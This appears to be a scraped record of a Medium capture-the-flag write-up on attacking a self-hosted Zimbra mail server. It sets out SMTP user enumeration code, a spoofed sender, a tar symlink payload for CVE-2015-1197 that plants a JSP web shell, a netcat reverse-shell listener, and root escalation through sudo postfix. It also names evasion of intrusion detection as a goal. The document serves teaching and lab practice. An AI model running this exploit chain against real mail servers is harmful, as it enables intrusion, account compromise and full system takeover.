{
    "id": "wrong_mix_domain_subsidiary_00036_3",
    "rank": 56,
    "data": {
        "url": "https://medium.com/%40opabravo/zimbra-ctf-writeup-manually-6afe91be52a0",
        "read_more_link": "",
        "language": "en",
        "title": "Zimbra CTF Writeup : Sneaky Way (Manually)",
        "top_image": "https://miro.medium.com/v2/resize:fit:1200/1*CUzUiKukWbVU03T9ZopPBQ.png",
        "meta_img": "https://miro.medium.com/v2/resize:fit:1200/1*CUzUiKukWbVU03T9ZopPBQ.png",
        "images": [
            "https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png",
            "https://miro.medium.com/v2/resize:fill:88:88/1*dyprZJUVA6Ge4CtgeQkO9A.jpeg",
            "https://miro.medium.com/v2/resize:fill:144:144/1*dyprZJUVA6Ge4CtgeQkO9A.jpeg"
        ],
        "movies": [],
        "keywords": [],
        "meta_keywords": [
            ""
        ],
        "tags": null,
        "authors": [
            "Fate Walker",
            "medium.com"
        ],
        "publish_date": "2023-01-05T15:34:33.860000+00:00",
        "summary": "",
        "meta_description": "I created zimbra CTF a while ago and decided to make writeup in three different ways: manually || scripting || using metasploit . Write a simple script to enumerate usernames because nmap’s nse …",
        "meta_lang": "en",
        "meta_favicon": "https://miro.medium.com/v2/1*m-R_BkNf1Qjr1YbyOIJY2w.png",
        "meta_site_name": "Medium",
        "canonical_link": "https://medium.com/@opabravo/zimbra-ctf-writeup-manually-6afe91be52a0",
        "text": "Zimbra CTF writeup manually without metasploit and public scripts to be less aggressive\n\nIntroduction\n\nI created zimbra CTF a while ago and decided to make writeup in three different ways: manually || scripting || using metasploit .\n\nThese writeups were intended to follow OSCP report format.\n\nMore detailed writeups will be posting progressively.\n\nLinks to writeups:\n\nHow to setup zimbra CTF\n\nZimbra CTF : Sneaky Way (Manually)\n\nZimbra CTF: Fast Way (Scripting)\n\nZimbra CTF : Easy Way (w/ Metasploit)\n\nObjective\n\nWhy doing manually?\n\nLess noisy to circumvent intrusion detection\n\nAntivirus and Firewall Evasion\n\nNot being a script kiddie\n\nRequirements\n\nRestrictions\n\nUsing automated exploit scripts that was written by others\n\nSpoofing (IP, ARP, DNS, NBNS, etc)\n\nCommercial tools or services (Metasploit Pro, Burp Pro, etc.)\n\nAutomatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)\n\nMass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)\n\nChatbots (e.g. ChatGPT, YouChat, etc.)\n\nMethodologies\n\nDuring a research on shodan, Fate Walker found a server vulnerable to CVE-2022–41352.\n\nBelow is a breakout of how Fate was able to identify and exploit the variety of systems.\n\nInformation Gathering\n\nPassive Recon\n\nDomain : zimbras.mooo.com\n\nIP: 104.248.107.93\n\nWhois Lookup\n\n┌──(root㉿root)-[~]\n\n└─# whois mooo.com\n\nDomain Name: MOOO.COM\n\nRegistry Domain ID: 23206068_DOMAIN_COM-VRSN\n\nRegistrar WHOIS Server: whois.porkbun.com\n\nRegistrar URL: http://porkbun.com\n\nUpdated Date: 2022-07-22T03:13:13Z\n\nCreation Date: 2000-03-24T06:27:37Z\n\nRegistry Expiry Date: 2024-03-24T05:27:37Z\n\nRegistrar: Porkbun LLC\n\nRegistrar IANA ID: 1861\n\nRegistrar Abuse Contact Email: abuse@porkbun.com\n\nRegistrar Abuse Contact Phone: 5038508351\n\nDomain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n\nDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n\nName Server: NS1.AFRAID.ORG\n\nName Server: NS2.AFRAID.ORG\n\nName Server: NS3.AFRAID.ORG\n\nName Server: NS4.AFRAID.ORG\n\nDNSSEC: unsigned\n\nURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n\nThe name server: AFRAID.ORG is known as a free dns service\n\nGet dns records\n\n┌──(root㉿root)-[~]\n\n└─# dig zimbras.mooo.com\n\n...\n\n;; ANSWER SECTION:\n\nzimbras.mooo.com. 3600 IN A 104.248.107.93\n\n...\n\nOnly one A record that points to 104.248.107.93\n\nGather more info using shodan.io, censys and other OSINT sources\n\nGather basic info\n\n┌──(root㉿root)-[~]\n\n└─# shodan host 104.248.107.93\n\n104.248.107.93\n\nHostnames: mail.example.org\n\nCity: Toronto\n\nCountry: Canada\n\nOrganization: DigitalOcean, LLC\n\nUpdated: 2023-01-05T04:25:09.714779\n\nNumber of open ports: 3\n\nPorts:\n\n25/tcp Postfix smtpd\n\n|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3\n\n137/udp\n\n443/tcp\n\n3001/tcp\n\n|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2\n\nIt’s a digital ocean VPS\n\nhostname : mail.example.org , which should be a virtual domain name\n\nweb server opened on 443, postfix mail server opened on 25\n\nGrab all history from the ip and analyze it\n\n┌──(root㉿root)-[~]\n\n└─# shodan host 104.248.107.93 -S --format pretty --history\n\n104.248.107.93\n\nHostnames: mail.example.org;tiffin.bakerst.org\n\nCity: Toronto\n\nCountry: Canada\n\nOrganization: DigitalOcean, LLC\n\nUpdated: 2023-01-05T04:25:09.714779\n\nNumber of open ports: 9\n\n...\n\nAnalyze the host data\n\n┌──(root㉿root)-[~]\n\n└─# zcat 104.248.107.93.json.gz | jq -r | grep -i zimbra -E10\n\n┌──(root㉿root)-[~]\n\n└─# zcat 104.248.107.93.json.gz | jq '.data | select(\"zimbra\")' -r | grep -i zimbra\n\n...\n\n* ID (\\\"NAME\\\" \\\"Zimbra\\\" \\\"VERSION\\\" \\\"8.8.15_GA_4173\\\" \\\"RELEASE\\\" \\\"20211022125231\\\")\\r\n\n...\n\n* Zimbra Collaboration Suite Web Client\n\n...\n\nUsing Zimbra Collaboration Suite Web Client, version: 8.8.15_GA_4173 , released on 20211022125231\n\nTIP: We can find out more servers via shodan query\n\n┌──(root㉿root)-[~]\n\n└─# shodan stats \"NAME\" \"Zimbra\" \"VERSION\" \"8.8.15*\"\n\nTop 10 Results for Facet: country\n\nUS 2,655\n\nDE 2,494\n\nFR 1,741\n\nRU 1,714\n\nBR 1,341\n\nIT 1,340\n\nID 1,063\n\nCA 905\n\nPL 829\n\nIN 683\n\nTop 10 Results for Facet: org\n\nHetzner Online GmbH 1,186\n\nOVH SAS 618\n\nContabo GmbH 535\n\nOVH Hosting, Inc. 267\n\nCSLOXINFO-IDC 220\n\nAmazon Technologies Inc. 211\n\nDigitalOcean, LLC 207\n\nPerformance Technology, Inc. 183\n\nFastweb SpA 165\n\nLinode 157\n\nTake a look at smtp\n\n┌──(root㉿root)-[~]\n\n└─# zcat 104.248.107.93.json.gz | jq | sed 's/\\\\n/\\n/g; s/\\\\t/\\t/g' | grep -i postfix -E10\n\n...\n\n\"hostnames\": [\n\n\"mail.example.org\"\n\n],\n\n\"org\": \"DigitalOcean, LLC\",\n\n\"data\": \"220 mail.example.org ESMTP Postfix\\r\n\n250-mail.example.org\\r\n\n250-PIPELINING\\r\n\n250-SIZE 10240000\\r\n\n250-VRFY\\r\n\n250-ETRN\\r\n\n250-STARTTLS\\r\n\n250-ENHANCEDSTATUSCODES\\r\n\n250-8BITMIME\\r\n\n250-DSN\\r\n\n250 CHUNKING\\r\n\n\",\n\n\"asn\": \"AS14061\",\n\n\"cpe23\": [\n\n\"cpe:2.3:a:postfix:postfix\"\n\n],\n\n\"isp\": \"DigitalOcean, LLC\",\n\n\"cpe\": [\n\n\"cpe:/a:postfix:postfix\"\n\n],\n\n...\n\nUsing Postfix as mail server\n\nUsing mail.example.org as mail domain\n\nSmtp server doesn’t seem to require authentication\n\nActive Recon\n\nNot using nmap, gobuster or other tools to be less aggressive since I gathered enough information from passive recon stage.\n\nVisit the index page on port 443\n\nUsing Zimbra, Java, Google Analytics, nginx\n\nObserve http response to measure how the web server works\n\nService Enumeration\n\nPerform Nmap Scan just for demonstration of standard active recons\n\n┌──(root㉿kali)-[~]\n\n└─# nmap -sV -sC -p- -Pn -T4 zimbras.mooo.com -oA zimbras -vv\n\n┌──(root㉿kali)-[~]\n\n└─# cat zimbras.nmap\n\n# Nmap 7.93 scan initiated Fri Jan 6 06:01:58 2023 as: nmap -sV -sC -p- -Pn -T4 -oA zimbras -vv zimbras.mooo.com\n\nNmap scan report for zimbras.mooo.com (104.248.107.93)\n\nHost is up, received user-set (0.00099s latency).\n\nScanned at 2023-01-06 06:01:59 UTC for 75s\n\nNot shown: 65530 closed tcp ports (reset)\n\nPORT STATE SERVICE REASON VERSION\n\n25/tcp open smtp syn-ack ttl 64 Postfix smtpd\n\n|_smtp-commands: mail.example.org, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n\n|_ssl-date: TLS randomness does not represent time\n\n| ssl-cert: Subject: commonName=mail.example.org/organizationalUnitName=Zimbra Collaboration Server\n\n| Subject Alternative Name: DNS:mail.example.org\n\n| Issuer: commonName=mail.example.org/organizationName=CA/organizationalUnitName=Zimbra Collaboration Server\n\n| Public Key type: rsa\n\n| Public Key bits: 2048\n\n| Signature Algorithm: sha256WithRSAEncryption\n\n| Not valid before: 2022-11-30T04:42:00\n\n| Not valid after: 2027-11-29T04:42:00\n\n| MD5: d5f6614bd2d745481749a4412192112a\n\n| SHA-1: 3340c8bd39202d187578d4cbb5113d0b8ac8c254\n\n...\n\n443/tcp open ssl/https syn-ack ttl 64\n\n| fingerprint-strings:\n\n| SSLSessionReq, TLSSessionReq:\n\n| HTTP/1.1 404 Not Found\n\n| Content-Length: 489\n\n| Content-Type: text/html\n\n| Server: frp/0.46.0\n\n| <!DOCTYPE html>\n\n| <html>\n\n| <head>\n\n| <title>Not Found</title>\n\n| <style>\n\n| body {\n\n| width: 35em;\n\n| margin: 0 auto;\n\n| font-family: Tahoma, Verdana, Arial, sans-serif;\n\n| </style>\n\n| </head>\n\n| <body>\n\n| <h1>The page you requested was not found.</h1>\n\n| <p>Sorry, the page you are looking for is currently unavailable.<br/>\n\n| Please try again later.</p>\n\n| <p>The server is powered by <a href=\"https://github.com/fatedier/frp\">frp</a>.</p>\n\n| <p><em>Faithfully yours, frp.</em></p>\n\n| </body>\n\n|_ </html>\n\n| http-methods:\n\n|_ Supported Methods: GET HEAD POST OPTIONS\n\n|_http-title: Zimbra Web Client Sign In\n\n...\n\n|_http-server-header: nginx\n\n3001/tcp open ssl/nessus? syn-ack ttl 64\n\n...\n\n|_ssl-date: TLS randomness does not represent time\n\n3002/tcp open http syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n\n| http-auth:\n\n| HTTP/1.1 401 Unauthorized\\x0D\n\n|_ Basic realm=Restricted\n\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n\nService Info: Host: mail.example.org; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nUsing frp as reverse proxy\n\nmail.example.org should be its internal dns\n\nUsing nginx as web server on linux\n\nZimbra Web Client\n\nPenetration\n\nAccording to CVETrends result, we found Zimbra 8.8.15 vulnerable to CVE-2022–41352.\n\nExamine smtp server\n\n┌──(root㉿root)-[~]\n\n└─# rlwrap nc zimbras.mooo.com 25\n\n220 mail.example.org ESMTP Postfix\n\nHELO all\n\n250 mail.example.org\n\n...\n\nMAIL FROM:qaq@qaq.com\n\n250 2.1.0 Ok\n\nRCPT TO:qaq@qaq.com\n\n554 5.7.1 <qaq@qaq.com>: Relay access denied\n\nRCPT TO:qaq@mail.example.org\n\n550 5.1.1 <qaq@mail.example.org>: Recipient address rejected: mail.example.org\n\nChecks for valid mail relay and mail recipient\n\nWrite a simple script to enumerate usernames because nmap’s nse : smtp- enum-users doesn’t work in this case\n\nThis won’t be too noisy compare to password bruteforcing since it only triggers code 550 on failing\n\nCode:\n\nimport smtplib\n\nusers_fp = \"/usr/share/seclists/Usernames/top-usernames-shortlist.txt\"\n\nwith open(users_fp, \"r\") as f:\n\nfor user in f:\n\nemail = f\"{user.strip()}@mail.example.org\"\n\ntry:\n\nsmtp = smtplib.SMTP(\"zimbras.mooo.com\", 25)\n\nsmtp.ehlo()\n\nsmtp.mail(\"qaq@qaq.com\")\n\nresp = smtp.rcpt(email)\n\nprint(resp)\n\nif resp[0] == 250:\n\nprint(f\"Found: {email}\")\n\nfinally:\n\nsmtp.quit()\n\nResult:\n\n┌──(root㉿kali)-[~]\n\n└─# python3 smtp_user_enum.py\n\n(250, b'2.1.5 Ok')\n\nFound: root@mail.example.org\n\n(250, b'2.1.5 Ok')\n\nFound: admin@mail.example.org\n\n(550, b'5.1.1 <test@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(250, b'2.1.5 Ok')\n\nFound: guest@mail.example.org\n\n(550, b'5.1.1 <info@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <adm@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <mysql@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <user@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <administrator@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <oracle@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <ftp@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <pi@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <puppet@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <ansible@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <ec2-user@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <vagrant@mail.example.org>: Recipient address rejected: mail.example.org')\n\n(550, b'5.1.1 <azureuser@mail.example.org>: Recipient address rejected: mail.example.org')\n\nFound users: admin, root, guest\n\nMail guest to not alarm the admins\n\n┌──(root㉿root)-[~]\n\n└─# rlwrap nc zimbras.mooo.com 25\n\n220 mail.example.org ESMTP Postfix\n\nHELO mail.example.org\n\n250 mail.example.org\n\nMAIL FROM:googl-ads@google.com\n\n250 2.1.0 Ok\n\nRCPT TO:guest@mail.example.org\n\n250 2.1.5 Ok\n\nDATA\n\n354 End data with <CR><LF>.<CR><LF>\n\nqaq\n\n.\n\n250 2.0.0 Ok: queued as 67B81440041\n\nSuccessfully sent the email\n\nThe other method to get in zimbra mail:\n\nAt first I didn’t recognize that the mail service don’t require authentication.\n\nThus wrote a script to bruteforce http post form on weak passwords using wordlist from Seclist.\n\nBut that was too aggressive, dont’t recommend using this method\n\nScript Link :\n\nhttps://gist.github.com/opabravo/1ba2a0adafce7cd48c358dab150872dc\n\nResult:\n\nroot@ip-10-10-23-197:~# python3 brute-http-form.py\n\nTrying | root@mail.example.org : 123456\n\nTrying | root@mail.example.org : 123456789\n\n...\n\n****************************************\n\nSuccess | guest@mail.example.org : xxxxxxxxxxxxxx\n\n****************************************\n\nGet reverse shell\n\nCraft a tar payload to exploit cpio’s CVE-2015–1197 since cpio was used by zimbra’s antivirus Amavis\n\n┌──(root㉿kali)-[~]\n\n└─# sudo mkdir -p /opt/zimbra/jetty_base/webapps/zimbra/public\n\n┌──(root㉿kali)-[~]\n\n└─# ln -s /opt/zimbra/jetty_base/webapps/zimbra/public ./qaq\n\n┌──(root㉿kali)-[~]\n\n└─# echo '<% out.println(\"QaQ\"); %>' > qaq/qaq.jsp\n\n┌──(root㉿kali)-[~]\n\n└─# tar -cf qaq.tar qaq qaq/qaq.jsp\n\n┌──(root㉿kali)-[~]\n\n└─# tar -tvf qaq.tar\n\nlrwxrwxrwx root/root 0 2023-01-05 11:24 qaq -> /opt/zimbra/jetty_base/webapps/zimbra/public\n\n-rw-r--r-- root/root 26 2023-01-06 07:12 qaq/qaq.jsp\n\nSend the payload\n\n┌──(root㉿kali)-[~]\n\n└─# sendemail -f google-ads@google.com -a qaq.tar -t guest@mail.example.org -s zimbras.mooo.com -o tls=no\n\nReading message body from STDIN because the '-m' option was not used.\n\nIf you are manually typing in a message:\n\n- First line must be received within 60 seconds.\n\n- End manual input with a CTRL-D on its own line.\n\nJan 06 07:13:42 kali sendemail[2143776]: Message input complete.\n\nJan 06 07:13:44 kali sendemail[2143776]: Email was sent successfully!\n\nCheck if the exploit was successful\n\n┌──(root㉿kali)-[~]\n\n└─# curl -k \"https://zimbras.mooo.com/public/qaq.jsp\"\n\nQaQ\n\nChange it to simple jsp reverse shell script then get a shell\n\n┌──(root㉿kali)-[~]\n\n└─# rlwrap -cAr nc -lvnp 1111\n\nlistening on [any] 1111 ...\n\nconnect to [143.198.37.72] from (UNKNOWN) [1.1.1.1] 54218\n\nid\n\nuid=997(zimbra) gid=997(zimbra) groups=997(zimbra),0(root)\n\npwd\n\n/opt/zimbra/log\n\nUpgrade shell to TTY\n\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n\nbash: /root/.bashrc: Permission denied\n\nzimbra@mail:/opt/zimbra/log$\n\nGet user flag\n\nzimbra@mail:/opt/zimbra/log$ cd /home\n\ncd /home\n\nzimbra@mail:/home$ ls\n\nls\n\nuwu\n\nzimbra@mail:/home$ cd uwu/Desktop/\n\ncd uwu/Desktop/\n\nzimbra@mail:/home/uwu/Desktop$ ls -la\n\nls -la\n\ntotal 12\n\ndrwxr-xr-x 2 uwu uwu 4096 Nov 30 23:12 .\n\ndrwxr-xr-x 17 uwu uwu 4096 Jan 5 00:54 ..\n\n-rw-r--r-- 1 root root 16 Nov 30 23:12 user.txt\n\nzimbra@mail:/home/uwu/Desktop$ cat user.txt\n\ncat user.txt\n\nGSS{*******************}\n\nIn “real cases,” when we send an email that contains the malicious payload via free mailing services, the payload will be executed even if users don’t click on it; Zimbra’s built-in antivirus scan will trigger the payload once the mail is sent to the server.\n\nPrivilege Escalate\n\nCheck sudo\n\nzimbra@mail:/home/uwu/Desktop$ sudo -l\n\nsudo -l\n\nMatching Defaults entries for zimbra on mail:\n\nenv_reset, mail_badpass,\n\nsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n\n!requiretty\n\nUser zimbra may run the following commands on mail:\n\n(root) NOPASSWD: /opt/zimbra/libexec/zmstat-fd *\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/postfix\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/postalias\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/qshape.pl\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/postconf\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/postsuper\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/postcat\n\n(root) NOPASSWD: /opt/zimbra/libexec/zmqstat\n\n(root) NOPASSWD: /opt/zimbra/libexec/zmmtastatus\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/amavis-mc\n\n(root) NOPASSWD: /opt/zimbra/common/sbin/nginx\n\n(root) NOPASSWD: /opt/zimbra/libexec/zmmailboxdmgr\n\nSome executable files have permission to run as root without password\n\nI’ll use postfix in this case, take a look at postfix’s manual\n\nCreate a shell script that will start bash in interactive mode\n\nGive it permision to be executed\n\nStart the shell script by /opt/zimbra/common/sbin/postfix\n\nzimbra@mail:/home/uwu/Desktop$ echo \"/bin/bash -i\" > /tmp/qaq\n\nzimbra@mail:/home/uwu/Desktop$ chmod +x /tmp/qaq\n\nzimbra@mail:/home/uwu/Desktop$ sudo /opt/zimbra/common/sbin/postfix /tmp/qaq\n\nroot@mail:/opt/zimbra/data/postfix/spool# id\n\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@mail:/opt/zimbra/data/postfix/spool# cat /root/root.txt\n\nGSS{**********************}\n\nGOT Root flag created by myself : )\n\nMaintain Access\n\npass"
    }
}